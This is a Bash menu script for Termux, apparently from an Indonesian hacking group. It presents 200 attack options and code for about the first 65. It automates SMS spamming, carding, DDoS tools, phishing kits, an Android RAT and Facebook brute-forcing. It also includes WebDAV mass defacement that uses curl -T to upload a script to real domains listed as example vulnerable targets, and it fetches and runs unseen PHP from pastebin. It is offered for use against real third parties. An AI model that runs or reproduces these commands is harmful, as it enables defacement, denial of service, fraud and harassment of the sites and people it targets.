clear

cd ramModule

python2 please.py

sleep 1

cat asw.txt

$red

sleep 1

echo ""

echo "[===============================================[>"
echo  "1.> Spam Sms Tokopedia"
echo "[===============================================]>"
echo  "2.> Spam Sms Telkomnyet"
echo "[===============================================]>"
echo "3.> Spam Sms Matahari Mall"
echo "[===============================================]>"
echo "4.> Spam Sms HooqTV"
echo "[===============================================]>"
echo "5.> Spam Sms KFC"
echo "[===============================================]>"
echo "6.> Spam Sms PHD"
echo "[===============================================]>"
echo "7.> Spam Sms Whiskas"
echo "[===============================================]>"
echo "8.> Spam Sms ZiPAY"
echo "[===============================================]>"
echo "9.> CC buat Carding"
echo "[===============================================]>"
echo "10.> Spam Akun Gmail"
echo "[===============================================]>"
echo "11.> Whois LookUp"
echo "[===============================================]>"
echo "12.> Upload Admin Finder"
echo "[===============================================]>"
echo "13.> Script Deface Creator"
echo "[===============================================]>"
echo "14.> ReConDog Buat Information gathering"
echo "[===============================================]>"
echo "15.> Admin Login Finder"
echo "[===============================================]>"
echo "16.> Virus VbugMaker Creator"
echo "[===============================================]>"
echo "17.> dowload script deface orang"
echo "[===============================================]>"
echo "18.> Autolike Facebook"
echo "[===============================================]>"
echo "19.> Facebook Auto_Reaction"
echo "[===============================================]>"
echo "20.> Bot Komentar Facebook"
echo "[===============================================]>"
echo "21.> Install txtool"
echo "[===============================================]>"
echo "22.> install sqlscan"
echo "[===============================================]>"
echo "23.> install hash-buster"
echo "[===============================================]>"
echo "24.> Install Red_Hawk"
echo "[===============================================]>"
echo "25.> Install Torshammer buat DDOS website"
echo "[===============================================]>"
echo "26.> Install LITEDDOS buat DDOS website"
echo "[===============================================]>"
echo "27.> Install Hunner Framework"
echo "[===============================================]>"
echo "28.> Install Sqlmap Buat Inject Situs"
echo "[===============================================]>"
echo "29.> Install 4wsectools"
echo "[===============================================]>"
echo "30.> Install Lazymux Buat Install Tools"
echo "[===============================================]>"
echo "31.> Mempercepat / Menstabilkan Jaringan/sinyal"
echo "[===============================================]>"
echo "32.> Mempercepat / menstabilkan jaringan 2"
echo "[===============================================]>"
echo "33.> Install BinGoo"
echo "[===============================================]>"
echo "34.> Full Bot Facebook"
echo "[===============================================]>"
echo "35.> Install Termux-A"
echo "[===============================================]>"
echo "36.> Install Tools GadoGado"
echo "[===============================================]>"
echo "37.> Install Lazysqlmap"
echo "[===============================================]>"
echo "38.> Install tools diejoubu"
echo "[===============================================]>"
echo "39.> Install weeman Buat Phising"
echo "[===============================================]>"
echo "40.> Install iesDEFACE buat Deface Poc Webdav"
echo "[===============================================]>"
echo "41.> install errorcybertools"
echo "[===============================================]>"
echo "42.> install A-Rat untuk Retas Android"
echo "[===============================================]>"
echo "43.> Scan-Website-Admin-Login"
echo "[===============================================]>"
echo "44.> DEFACE metode Webdav"
echo "[===============================================]>"
echo "45.> Tools Katoolin"
echo "[===============================================]>"
echo "46.> Main Tebak2 kan:v biar ga bt:v"
echo "[===============================================]>"
echo "47.> Brute DEFACE webdav"
echo "[===============================================]>"
echo "48.> Browsing Di Termux"
echo "[===============================================]>"
echo "49.> Dengerin Lagu Youtube di Termux"
echo "[===============================================]>"
echo "50.> Tebak Tebak Kan Soal Cinta Tod" 
echo "[===============================================]>"
echo "51.> Bitcoin"
echo "[===============================================]>"
echo "52.> Install MetaSploit"
echo "[===============================================]>"
echo "53.> MultiBrute Force Facebook Buat Hack Facebook"
echo "[===============================================]>"
echo "54.> install WAScan"
echo "[===============================================]>"
echo "55.> install MultiSpam [Sms]"
echo "[===============================================]>"
echo "56.> Spam Sms "
echo "[===============================================]>"
echo "57.> DDOS xerxes"
echo "[===============================================]>"
echo "58.> IPGeoLocation Buat Lacak IP"
echo "[===============================================]>"
echo "59.> Install viSQL"
echo "[===============================================]>"
echo "60.> Install Kawai-Botnet Buat DDOS"
echo "[===============================================]>"
echo "61.> Install OWScan"
echo "[===============================================]>"
echo "62.> Install AstraNmap"
echo "[===============================================]>"
echo "63.> Install Auxscan2.0"
echo "[===============================================]>"
echo "64.> Install Black-Hydra"
echo "[===============================================]>"
echo "65.> Install Ipddos"
echo "[===============================================]>"
echo "66.> Install hasher"
echo "[===============================================]>"
echo "67.> Install PhisingGame Buat Hack ML & COC"
echo "[===============================================]>"
echo "68.> Kumpulan Tutorial Termux"
echo "[===============================================]>"
echo "69.> Chating Di Termux"
echo "[===============================================]>"
echo "70.> Panel Login Admin "
echo "[===============================================]>"
echo "71.> SocialFish Phising"
echo "[===============================================]>"
echo "72.> MoonBuggy  Main Game"
echo "[===============================================]>"
echo "73.> Cupp Worldlist Tertarget"
echo "[===============================================]>"
echo "74.> Hydra"
echo "[===============================================]>"
echo "75.> md5-crack"
echo "[===============================================]>"
echo "76.> LITESPAM Buat Spam"
echo "[===============================================]>"
echo "77.> Mulung Bitcoin"
echo "[===============================================]>"
echo "78.> Ko-Dork"
echo "[===============================================]>"
echo "79.> Lihat Spesifikasi Ponsel"
echo "[===============================================]>"
echo "80.> lhst"
echo "[===============================================]>"
echo "81.> The Fat Rat"
echo "[===============================================]>"
echo "82.> CMSmap"
echo "[===============================================]>"
echo "83.> Kali Ubuntu"
echo "[===============================================]>"
echo "84.> Ngrok"
echo "[===============================================]>"
echo "85.> Brute Force Gmail"
echo "[===============================================]>"
echo "86.> Lokomedia Exploiters"
echo "[===============================================]>"
echo "87.> Kali Linux Nethunter"
echo "[===============================================]>"
echo "88.> joomscan"
echo "[===============================================]>"
echo "89.> VulnScaner"
echo "[===============================================]>"
echo "90.> HN-Installer"
echo "[===============================================]>"
echo "91.> Fucking-Rat"
echo "[===============================================]>"
echo "92.> linux fedora"
echo "[===============================================]>"
echo "93.> information Gathering"
echo "[===============================================]>"
echo "94.> ezsploit [Harus Root]"
echo "[===============================================]>"
echo "95.> Dirsearch "
echo "[===============================================]>"
echo "96.> honeypot"
echo "[===============================================]>"
echo "97.> Killr"
echo "[===============================================]>"
echo "98.> Human_Level_Control"
echo "[===============================================]>"
echo "99.> Termux-Mpv"
echo "[===============================================]>"
echo "100.> OWASP-Nettacker"
echo "[===============================================]>"
echo "101.> OWASP-ZSC"
echo "[===============================================]>"
echo "102.> InfoGa"
echo "[===============================================]>"
echo "103.> cok-rat"
echo "[===============================================]>"
echo "104.> Hash-Generator"
echo "[===============================================]>"
echo "105.> Open Source Information Facebook"
echo "[===============================================]>"
echo "106.> str2bf"
echo "[===============================================]>"
echo "107.> BForce"
echo "[===============================================]>"
echo "108.> Web Application Audit Framework"
echo "[===============================================]>"
echo "109.> SMBrute"
echo "[===============================================]>"
echo "110.> Wordpress Security Scanner"
echo "[===============================================]>"
echo "111.> hmap (fingerprinting web servers)"
echo "[===============================================]>"
echo "112.> Auto Report Facebook"
echo "[===============================================]>"
echo "113.> dhcpdorf"
echo "[===============================================]>"
echo "114.> deskcon-desktop"
echo "[===============================================]>"
echo "115.> Tools suRAT-Cinta"
echo "[===============================================]>"
echo "116.> Tools m4ngARP"
echo "[===============================================]>"
echo "117.> Tools WP-Hunter"
echo "[===============================================]>"
echo "118.> Remote-Shell"
echo "[===============================================]>"
echo "119.> LITESCRIPT "
echo "[===============================================]>"
echo "120.> meTAInstall"
echo "[===============================================]>"
echo "121.> Zilcorili (Security Framework) "
echo "[===============================================]>"
echo "122.> AutoScriptKiddiesTool "
echo "[===============================================]>"
echo "123.> bot-exploiters"
echo "[===============================================]>"
echo "124.> Termux-metasploit [work] "
echo "[===============================================]>"
echo "125.> Instagram Bot"
echo "[===============================================]>"
echo "126.> FesbukBrute"
echo "[===============================================]>"
echo "127.> Email-Harvester"
echo "[===============================================]>"
echo "128.> Gdog Backdoor Using Gmail"
echo "[===============================================]>"
echo "129.> Penetration Testing Engagements"
echo "[===============================================]>"
echo "130.> CanisRufus"
echo "[===============================================]>"
echo "131.> EttercapForAndroid"
echo "[===============================================]>"
echo "132.> BlackNmap"
echo "[===============================================]>"
echo "133.> NMapForAndroid"
echo "[===============================================]>"
echo "134.> 1337Rat "
echo "[===============================================]>"
echo "135.> Universal Fedora Chroot Tool"
echo "[===============================================]>"
echo "136.> Knock Subdomain Scan  "
echo "[===============================================]>"
echo "137.> OWASP-vbscan"
echo "[===============================================]>"
echo "138.> Dracnmap"
echo "[===============================================]>"
echo "139.> Tool Brutal "
echo "[===============================================]>"
echo "140.> BruteSploit "
echo "[===============================================]>"
echo "141.> Microsploit"
echo "[===============================================]>"
echo "142.> Vegile"
echo "[===============================================]>"
echo "143.> PhEmail"
echo "[===============================================]>"
echo "144.> reposcanner"
echo "[===============================================]>"
echo "145.> Search drives for credit card numbers "
echo "[===============================================]>"
echo "146.> Zambie"
echo "[===============================================]>"
echo "147.> TrackUrl"
echo "[===============================================]>"
echo "148.> DataSploit "
echo "[===============================================]>"
echo "149.> E-Bomber"
echo "[===============================================]>"
echo "150.> Vbugmap.py"
echo "[===============================================]>"
echo "151.> Admin Finder Fast "
echo "[===============================================]>"
echo "152.> pynmap"
echo "[===============================================]>"
echo "153.> sqli-scanner"
echo "[===============================================]>"
echo "154.> port-lookup"
echo "[===============================================]>"
echo "155.> tic-tac-toe"
echo "[===============================================]>"
echo "156.> folderlocker"
echo "[===============================================]>"
echo "157.> xerosploit"
echo "[===============================================]>"
echo "158.> Wifresti (Wifi-Password Recovery tool)"
echo "[===============================================]>"
echo "159.> TheFuck "
echo "[===============================================]>"
echo "160.> sqliv"
echo "[===============================================]>"
echo "161.> Linux Local Root Exploiters"
echo "[===============================================]>"
echo "162.> BlackMail"
echo "[===============================================]>"
echo "163.> BlackTrack"
echo "[===============================================]>"
echo "164.> HashCode "
echo "[===============================================]>"
echo "165.> Dec-Enc-Hash"
echo "[===============================================]>"
echo "166.> hostchecker"
echo "[===============================================]>"
echo "167.> myenc (encrypt script python)"
echo "[===============================================]>"
echo "168.> StartPhp"
echo "[===============================================]>"
echo "169.> Facenotify (Facebook Notify Review) "
echo "[===============================================]>"
echo "170.> notefast (notepad for linux"
echo "[===============================================]>"
echo "171.> Server_domains"
echo "[===============================================]>"
echo "172.> Tool-Kit"
echo "[===============================================]>"
echo "173.> MyServer"
echo "[===============================================]>"
echo "174.> Recon-ng_termux_by_viral"
echo "[===============================================]>"
echo "175.> Metasploit_For_Termux"
echo "[===============================================]>"
echo "176.> Setoolkit-for-termux "
echo "[===============================================]>"
echo "177.> Kali-linux_For_Termux "
echo "[===============================================]>"
echo "178.> XSStrike"
echo "[===============================================]>"
echo "179.> Hue powerful interface to print colored "
echo "[===============================================]>"
echo "180.> Nano (family of PHP webshells)"
echo "[===============================================]>"
echo "181.> Entropy"
echo "[===============================================]>"
echo "182.> Decodify"
echo "[===============================================]>"
echo "183.> Shellstack"
echo "[===============================================]>"
echo "184.> Facebook-Video-Downloader"
echo "[===============================================]>"
echo "185.> StabilizerBot"
echo "[===============================================]>"
echo "186.> RemBot"
echo "[===============================================]>"
echo "187.> Touchingsky"
echo "[===============================================]>"
echo "188.> thanatos"
echo "[===============================================]>"
echo "189.> thanatos-archer"
echo "[===============================================]>"
echo "190.> BruteXSS "
echo "[===============================================]>"
echo "191.> CSRF poc maker"
echo "[===============================================]>"
echo "192.> Sarahah-XSS-Exploit "
echo "[===============================================]>"
echo "193.> PHP-BackConnector"
echo "[===============================================]>"
echo "194.> XEIT_Cyber "
echo "[===============================================]>"
echo "195.> BoxSosmed"
echo "[===============================================]>"
echo "196.> CrewBot"
echo "[===============================================]>"
echo "197.> BoxSpam "
echo "[===============================================]>"
echo "198.> CamStream-V3  "
echo "[===============================================]>"
echo "199.> InstaHack buat Hek Instagram "
echo "[===============================================]>"
echo "200.> Google-Dork Buat dorking Di termux"
echo "[===============================================]>"

cowsay -e -f HIIII  EXIT 0 | lolcat

echo "[+]===============================================[+]" | lolcat
echo "Sᴇʟᴇᴄᴛ ᴛʜᴇ Nᴜᴍʙᴇʀ" | lolcat

read -p "»—MR.AnonYmous——»" bro

if [ $bro = 1 ] || [ $bro = 1 ]
then
clear
figlet "Mr.AnonYmous" | lolcat
php tp.php

ls
bash ram.sh

fi

if
[ $bro = 2 ] || [ $bro = 2 ]
then
clear
toilet "Mr.AnonYmous"
php t.php
fi

if [ $bro = 3 ] || [ $bro = 3 ]
then
figlet "Mr.AnonYmous"
php mataharimall.php
fi

if [ $bro = 4 ] || [ $bro = 4 ]
then
clear
toilet "Mr.AnonYmous"
php hooq.php
fi

if [ $bro = 5 ] || [ $bro = 5 ]
then
clear
toilet -f slant --gay "Mr.AnonYmous"
php kfc.php
fi

if [ $bro = 6 ] || [ $bro = 6 ]
then
clear
toilet -f mono12 -F gay "Mr.AnonYmous"
php phd.php
fi

if [ $bro = 7 ] || [ $bro = 7 ]
then
clear
toilet "Mr.AnonYmous"
php whiskas.php
fi

if [ $bro = 8 ] || [ $bro = 8 ]
then
clear
figlet "Mr.AnonYmous"
php zipay.php
fi

if [ $bro = 9 ] || [ $bro = 9 ]
then
clear
toilet "Mr.AnonYmous"
php key.php
fi

if [ $bro = 10 ] || [ $bro = 10 ]
then
clear
toilet "Mr.AnonYmous"
python2 SpamMail.py
fi

if [ $bro = 11 ] || [ $bro = 11 ]
then
clear
toilet "Mr.AnonYmous"
python2 whs.py
fi

if [ $bro = 12 ] || [ $bro = 12 ]
then
clear
toilet "Mr.AnonYmous"
python2 upf.py
fi

if [ $bro = 13 ] || [ $bro = 13 ]
then
clear
toilet "Mr.AnonYmous"
python2 create.py
fi

if [ $bro = 14 ] || [ $bro = 14 ]
then
clear
toilet "Mr.AnonYmous"
python2 dog.py
fi

if [ $bro = 15 ] || [ $bro = 15 ]
then
clear
toilet "Mr.AnonYmous"
python2 gam.py
fi

if [ $bro = 16 ] || [ $bro = 16 ]
then
clear
toilet "Mr.AnonYmous"
python2 anvima.py
fi

if [ $bro = 17 ] || [ $bro = 17 ]
then
clear
toilet "Mr.AnonYmous"
python2 htmd.py
fi

if [ $bro = 18 ] || [ $bro = 18 ]
then
clear
toilet "Mr.AnonYmous"
php autolike.php
fi

if [ $bro = 19 ] || [ $bro = 19 ]
then
clear
toilet "Mr.AnonYmous"
python2 auto_reaction.py
fi

if [ $bro = 20 ] || [ $bro = 20 ]
then
clear
figlet "Mr.AnonYmous" | lolcat
python2 botkomen.py
fi

if [ $bro = 21 ] || [ $bro = 21 ]
then
clear
figlet "Mr.AnonYmous" | lolcat

git clone https://github.com/kuburan/txtool
mv txtool $HOME
cd $HOME/txtool
python2 install.py
python2 update.py
txtool
ls
bash ram.sh

fi


if [ $bro = 22 ] || [ $bro = 22 ]
then
clear
toilet -f slant -F gay "Mr.AnonYmous" 
pkg install update && pkg install upgrade
pkg install git
pkg install php
cd module
php sqlscan.php
fi

if [ $bro = 23 ] || [ $bro = 23 ]
then
clear
toilet -f mono12 -F gay "Mr.AnonYmous" 
apt upgrade
apt install python2
apt install git
git clone https://github.com/UltimateHackers/Hash-Buster
mv Hash-Buster $HOME
cd $HOME/Hash-Buster
python2 hash.py

ls 
bash ram.sh

fi

if [ $bro = 24 ] 
then

clear

toilet -f standard -F gay "Mr.AnonYmous" 

sleep 3

apt update
apt install git
apt install php
git clone https://github.com/Tuhinshubhra/RED_HAWK
mv RED_HAWK $HOME
cd $HOME/RED_HAWK
chmod +x rhawk.php
php rhawk.php

ls
bash ram.sh

fi

if [ $bro = 25 ] || [ $bro = 25 ]
then
clear
toilet -f standard -F gay "Mr.AnonYmous" 
apt update
apt install git
apt install tor
git clone https://github.com/dotfighter/torshammer.git
mv torshammer $HOME
cd $HOME/torshammer

python2 torshammer.py -T -t target
fi

if [ $bro = 26 ] || [ $bro = 26 ]
then
clear
toilet -f standard -F gay "Mr.AnonYmous" 

sleep 3
apt update
apt install git
git clone https://github.com/4L13199/LITEDDOS
mv LITEDDOS $HOME
cd $HOME/LITEDDOS

python2 LITEDDOS.py target 80 100
fi

if [ $bro = 27  || [ $bro = 27 ]
then
clear
toilet -f standard -F gay "Mr.AnonYmous" 
apt update
apt install git
git clone https://github.com/b3-v3r/Hunner.git
mv Hunner $HOME
cd $HOME/Hunner
chmod +x hunner.py
python2 hunner.py
fi

if [ $bro = 28 ] || [ $bro = 28 ]
then
clear
toilet -f standard -F gay "Mr.AnonYmous"
apt update
apt install git
git clone https://github.com/sqlmapproject/sqlmap
mv sqlmap $HOME
cd $HOME/sqlmap

python2 sqlmap.py -D target
fi

if [ $bro = 29 ] || [ $bro = 29 ]
then
clear
toilet -f standard -F gay "Mr.AnonYmous" 
apt update
apt install git
git clone https://github.com/aryanrtm/4wsectools
mv 4wsectools $HOME
cd $HOME/4wsectools
chmod 777 tools
./tools
fi

if [ $bro = 30 ] || [ $bro = 30 ]
then
clear
figlet "Mr.AnonYmous" | lolcat
apt update && upgrade
apt install python2 
apt install git
cd module
python2 lazymux.py
fi

if [ $bro = 31 ] || [ $bro = 31 ]
then
clear
figlet "Mr.B4J1N64N" | lolcat
sleep 1
echo "\033[32;m====================Mempercepat / menstabilkan sinyal===================="
sleep 1
echo "\033[32;1m================================By Mr.B4J1N64N================================"
sleep 1
echo ""
echo ""
ping 8.8.8.8 
fi

if [ $bro = 32 ] || [ $bro = 32 ]
then
clear
figlet "Mr.AnonYmous" | lolcat
sleep 1
echo "\033[32;m===================Mempercepat / menstabilkan sinyal 2===================="
sleep 1
echo "\033[32;1m================================By Mr.B4J1N64N================================"
sleep 1
echo ""
echo ""
ping -D www.google.com
fi

if [ $bro = 33 ] || [ $bro = 33 ]
then
clear
figlet "Mr.AnonYmous" | lolcat
sleep 1
git clone https://github.com/Hood3dRob1n/BinGoo
mv BinGoo $HOME
cd $HOME/BinGoo
bash bingoo
fi

if [ $bro = 34 ] || [ $bro = 34 ]
then
clear
figlet "Mr.AnonYmous" | lolcat
sleep 1
cd module
python2 facebook.py
fi

if [ $bro = 35 ] || [ $bro = 35 ]
then
clear
figlet "Mr.AnonYmous" | lolcat
sleep 1
apt update && apt upgrade
apt install termux-api
apt install git
apt install php
git clone https://github.com/Cvar1984/Termux-A.git
mv Termux-A $HOME
cd $HOME/Termux-A
php run.php
fi

if [ $bro = 36 ] || [ $bro = 36 ]
then
clear
figlet "Mr.AnonYmous" | lolcat
sleep 1
apt update && apt upgrade
apt install ruby
apt install lolcat
apt install git
git clone https://github.com/Senitopeng/GadoGado.git
mv GadoGado $HOME
cd $HOME/GadoGado
bash gado
fi

if [ $bro = 37 ] || [ $bro = 37 ]
then
clear
figlet "Mr.AnonYmous" | lolcat
sleep 1
apt update && apt upgrade
apt install python2
apt install git
git clone https://github.com/verluchie/termux-lazysqlmap.git
mv termux-lazysqlmap $HOME
cd $HOME/termux-lazysqlmap
chmod 777 install.sh
./install.sh
lazysqlmap
fi

if [ $bro = 38 ] || [ $bro = 38 ]
then
clear
figlet "Mr.AnonYmous" | lolcat
sleep 1 
apt install git
apt install php
git clone https://github.com/alintamvanz/diejoubu
mv diejoubu $HOME
cd $HOME/diejoubu
cd v1.2
php diejoubu.php
fi

if [ $bro = 39 ] || [ $bro = 39 ]
then
clear
figlet "Mr.AnonYmous" | lolcat
sleep 1 
apt install git
apt install php
git clone https://github.com/evait-security/weeman.git
mv weeman $HOME
cd $HOME/weeman
python2 weeman.py
fi

if [ $bro = 40 ] || [ $bro = 40 ]
then
clear
figlet "Mr.B4J1N64N" | lolcat
sleep 1 
apt install git
apt install bash
pip2 install bash
git clone https://github.com/ALX-04/iesDEFACE
mv iesDEFACE $HOME
cd $HOME/iesDEFACE
bash iesDeface.sh
fi

if [ $bro = 41 ] || [ $bro = 41 ]
then
clear
figlet "Mr.B4J1N64N" | lolcat
sleep 1
git clone https://github.com/MrKeepSmile/errorcybertool.git
mv errorcybertool $HOME
cd $HOME/errorcybertool
chmod 777 errorcyber
./errorcyber
fi

if [ $bro = 42 ] || [ $bro = 42 ]
then
clear
figlet "Mr.B4J1N64N" | lolcat
sleep 1
git clone https://github.com/Xi4u7/A-Rat.git
mv A-Rat $HOME
cd $HOME/A-Rat
python2 A-Rat.py
fi

if [ $bro = 43 ] || [ $bro = 43 ]
then
clear
figlet "Mr.B4J1N64N" | lolcat
sleep 1
git clone https://github.com/DarknessCyberTeam/Scan-Website-Admin-Login
mv Scan-Website-Admin-Login $HOME
cd $HOME/Scan-Website-Admin-Login
python2 Admin-Login.py
fi

if [ $bro = 44 ] || [ $bro = 44 ]
then
clear
echo "\033[34;1m"
cowsay -f kiss.cow "MrB4J1N64N" | lolcat
figlet -f slant MrB4J1N64N
echo "\033[37;1m"
echo "Masukan Web target"
echo "Contoh Web Target vuln"
echo "	http://bestilling.udir.no/"
echo "	http://560560.ru/"
echo "	http://myownemailer.com/"
echo "	http://Zoocentral.co.za/"
echo "	http://50-50-50.ru/"
echo "	http://tirupurjobs.net/"
echo "	http://Matrimony.co.za/"
echo "	http://Bheh.co.za/"
read -p "[MrB4J1N64N]>" target
echo "Masukan Nama script kalian"
echo "yang ada di Luar Folder Ruang Penyimpanan"
read -p "[MrB4J1N64N]>" script
curl -T /storage/emulated/0/$script $target
echo "\033[33;1m"
echo "Selesai! Tod Cek di $target $script "
fi

if [ $bro = 45 ] || [ $bro = 45 ]
then
clear
cowsay -f sheep.cow "MrB4J1N64N" | lolcat
figlet "Mr.B4J1N64N" | lolcat
sleep 1
cd
cd module
python2 katoolin.py
fi

if [ $bro = 46 ] || [ $bro = 46 ]
then
clear
cowsay -f kiss.cow "MrB4J1N64N" | lolcat
figlet "Mr.B4J1N64N" | lolcat
sleep 1
cd module
python2 r.py
fi

if [ $bro = 47 ] || [ $bro = 47 ]
then
clear
toilet -f standard -F gay "BruteWebdav"
echo "\033[32;1mauthor: Mr.B4J1N64N"
echo "\033[33;1mTeam: Darkness Cyber Team"
echo "\033[34;1mIndonesia Security Lite"
echo "\033[32;1mJawaBarat Blackhat Army"
echo "Masukan nama script"
read -p "[=======>" script
echo "\033[32;1m"
echo "Masukan Web Target Ke1"
read -p "[=======>" Ke1
curl -T /storage/emulated/0/$script $Ke1
echo "\033[32;1m" "Masukan Web Target Ke2 "
read -p "[=======>" Ke2
curl -T /storage/emulated/0/$script $Ke2
echo "\033[32;1m" "Masukan Web Target Ke3"
read -p "[=======>" Ke3
curl -T /storage/emulated/0/$script $Ke3
echo "\033[32;1m" "Masukan Web Target Ke4"
read -p "[=======>" Ke4
curl -T /storage/emulated/0/$script $Ke5
echo "\033[32;1m" "Masukan Web Target Ke5"
read -p "[=======>" Ke5
curl -T /storage/emulated/0/$script $Ke5
echo "\033[32;1m" "Masukan Web Target Ke6"
read -p "[=======>" Ke6
curl -T /storage/emulated/0/$script $Ke6
echo "\033[32;1m" "Masukan Web Target Ke7"
read -p "[=======>" Ke7
curl -T /storage/emulated/0/$script $Ke7
echo "\033[32;1m" "Masukan Web Target Ke8"
read -p "[=======>" Ke8
curl -T /storage/emulated/0/$script $Ke8
echo "\033[32;1m" "Masukan Web Target Ke9"
read -p "[=======>" Ke9
curl -T /storage/emulated/0/$script $Ke9
echo "\033[32;1m" "Masukan Web Target Ke10"
read -p "[=======>" Ke10
curl -T /storage/emulated/0/$script $Ke10
sleep 1
echo "[<=====================SEDANG PROSES=====================>]"
echo "Silahkan Cek Web $Ke1/$script"
echo "Silahkan Cek Web $Ke2/$script"
echo "Silahkan Cek Web $Ke3/$script"
echo "Silahkan Cek Web $Ke4/$script"
echo "Silahkan Cek Web $Ke5/$script"
echo "Silahkan Cek Web $Ke6/$script"
echo "Silahkan Cek Web $Ke7/$script"
echo "Silahkan Cek Web $Ke8/$script"
echo "Silahkan Cek Web $Ke9/$script"
echo "Silahkan Cek Web $Ke10/$script"
echo "[=============HAPPY DEFACE=============]"
fi

if [ $bro = 48 ] || [ $bro = 48 ]
then
clear
cowsay -f kiss.cow "MrB4J1N64N" | lolcat
figlet "Mr.B4J1N64N" | lolcat
sleep 1
pkg install w3m
w3m www.google.com
fi

if [ $bro = 49 ] || [ $bro = 49 ]
then
clear
cowsay -f kiss.cow "MrB4J1N64N" | lolcat
figlet "Mr.B4J1N64N" | lolcat
sleep 1
apt update && apt upgrade
apt install pip
pkg install python
pkg install python2
pip install mps_youtube
pip install youtube_dl
pkg install mpv
mpsyt
fi

if [ $bro = 50 ] || [ $bro = 50 ]
then
clear
cowsay -f kiss.cow "vbugmap.py" | lolcat
figlet "vbugmap.py" | lolcat
sleep 1
cd ramModuel
python2 vbugmap.py
fi

if [ $bro = 51 ] || [ $bro = 51 ]
then
clear
cowsay -f kiss.cow "MrB4J1N64N" | lolcat
figlet "Mr.B4J1N64N" | lolcat
sleep 1
pkg install php
pkg install wget
wget -O tuyul.php https://pastebin.com/raw/3ERZV3nL
mv tuyul.php $HOME
php $HOME/tuyul.php
fi

if [ $bro = 52 ] || [ $bro = 52 ]
then
clear
cowsay -f kiss.cow "MrB4J1N64N" | lolcat
figlet "Mr.B4J1N64N" | lolcat
sleep 1
pkg install curl
curl -LO https://raw.githubusercontent.com/Hax4us/Metasploit_termux/master/metasploit.sh
chmod +x metasploit.sh
./metasploit.sh

sleep 5
mv metasploit-framework $HOME
cd $HOME/metasploit-framework
./msfconsole
fi

if [ $bro = 53 ] || [ $bro = 53 ]
then
clear
cowsay -f kiss.cow "MrB4J1N64N" | lolcat
figlet "Mr.B4J1N64N" | lolcat

sleep 3
cd module
python2 mbf.py
fi

if [ $bro = 54 ] || [ $bro = 54 ]
then
clear
cowsay -f kiss.cow "MrB4J1N64N" | lolcat
figlet "Mr.B4J1N64N" | lolcat
sleep 1
apt update && apt upgrade
apt install python2
apt install git
pip2 install -r requirements.txt
git clone https://github.com/m4II0k/WAScan.git
mv WAScan $HOME
cd $HOME/WAScan
pip2 install -r requirements.txt
clear
chmod +x wascan.py
python2 wascan.py 
fi

if [ $bro = 55 ] || [ $bro = 55 ]
then
clear
echo "\033[31;1m"
cowsay ghostbusters.cow "MrB4J1N64N" 
figlet "Mr.B4J1N64N" | lolcat
apt update && apt upgrade
apt install python2
apt install python
apt install git
git clone https://github.com/Kereh/MultiSpam
mv MultiSpam $HOME
cd $HOME/MultiSpam
read -p "==== nomer target awalan [62] contoh 628xxxx===>" target
python2 Multispam.py --count=1000 target
sleep 1
fi

if [ $bro = 56 ] || [ $bro = 56 ]
then
clear
cowsay -f kiss.cow "MrB4J1N64N" | lolcat
figlet "Mr.B4J1N64N" | lolcat
sleep 1
apt install php
apt install curl
curl https://pastebin.com/raw/9BYy1JVc -o jdid.php
mv jdid.php $HOME
cd $HOME
php jdid.php
fi

if [ $bro = 57 ] || [ $bro = 57 ]
then
clear
toilet -f slant --gay "Mr.B4J1N64N"
apt update && apt upgrade
apt install git
apt install clang
git clone https://github.com/zanyarjamal/xerxes
mv xerxes $HOME
cd $HOME/xerxes
clang xerxes.c -o xerxes
clear
read -p "[masukanWebsiteTarget]>" target
./xerxes target 80
fi

if [ $bro = 58 ] || [ $bro = 58 ]
then
clear
figlet "Mr.B4J1N64N" | lolcat

sleep 3
apt install git
apt install python
apt install python2
git clone https://github.com/maldevel/IPGeoLocation.git
mv IPGeoLocation $HOME
cd $HOME/IPGeoLocation
chmod +x ipgeoLocation.py
pip install -r requirements.txt
python ipgeolocation.py -m
read -p "[Masukan IP/website]>" target
python ipgeolocation.py -t target
fi

if [ $bro = 59 ] || [ $bro = 59 ]
then
clear
cowsay -f kiss.cow "MrB4J1N64N" | lolcat
figlet "Mr.B4J1N64N" | lolcat
sleep 1
apt update && apt upgrade
apt install python2
apt install git
git clone https://github.com/blackvkng/viSQL
mv viSQL $HOME
cd $HOME/viSQL
python2 -m pip install -r requirements.txt
python2 viSQL.py
read -p "[Masukan Website Target]>" target
python2 viSQL.py -t target
fi

if [ $bro = 60 ] || [ $bro = 60 ]
then
clear
cowsay -f kiss.cow "MrB4J1N64N" | lolcat
figlet "Mr.B4J1N64N" | lolcat
sleep 1
apt update && apt upgrade
apt install php
apt install git
git clone https://github.com/Cvar1984/Kawai-Botnet
mv Kawai-Botnet $HOME
cd $HOME/Kawai-Botnet

php kawai.php target 4 0 9999
fi

if [ $bro = 61 ] || [ $bro = 61 ]
then
clear
cowsay -f kiss.cow "MrB4J1N64N" | lolcat
figlet "Mr.B4J1N64N" | lolcat
sleep 1
apt update && apt upgrade
apt install git
apt install php
git clone https://github.com/Gameye98/OWScan.git
mv OWScan $HOME
cd $HOME/OWScan
php owscan.php
fi

if [ $bro = 62 ] || [ $bro = 62 ]
then
clear
cowsay -f kiss.cow "MrB4J1N64N" | lolcat
figlet "Mr.B4J1N64N" | lolcat
sleep 1
apt update && apt upgrade
apt install git
apt install sh
pip2 install sh
git clone https://github.com/Gameye98/AstraNmap
mv AstraNmap $HOME
cd $HOME/AstraNmap
sh astranmap.sh
fi

if [ $bro = 63 ] || [ $bro = 63 ]
then
clear
cowsay -f kiss.cow "MrB4J1N64N" | lolcat
figlet "Mr.B4J1N64N" | lolcat
sleep 1
apt update && apt upgrade
apt install git
apt install python
apt install python2
git clone https://github.com/Gameye98/Auxscan2.0.git
mv Auxscan2.0 $HOME
cd $HOME/Auxscan2.0
python2 auxscan.py
fi

if [ $bro = 64 ] || [ $bro = 64 ]
then
clear
cowsay -f kiss.cow "MrB4J1N64N" | lolcat
figlet "Mr.B4J1N64N" | lolcat
sleep 1
apt update && apt upgrade
apt install git
apt install python
apt install python2
git clone https://github.com/Gameye98/Black-Hydra.git
mv Black-Hydra $HOME
cd $HOME/Black-Hydra
python2 blackhydra.py
fi

if [ $bro = 65 ] || [ $bro = 65 ]
then
clear
cowsay -f kiss.cow "MrB4J1N64N" | lolcat
figlet "Mr.B4J1N64N" | lolcat
sleep 1
apt update && apt upgrade
apt install git
apt install python
apt install python2
git clone https://github.com/CiKu370/ipddos.git
mv ipddos $HOME
cd $HOME/ipddos
echo "[Ddos Pake Ip + port]"
echo "[Contoh 127.x.x.x 8080]"
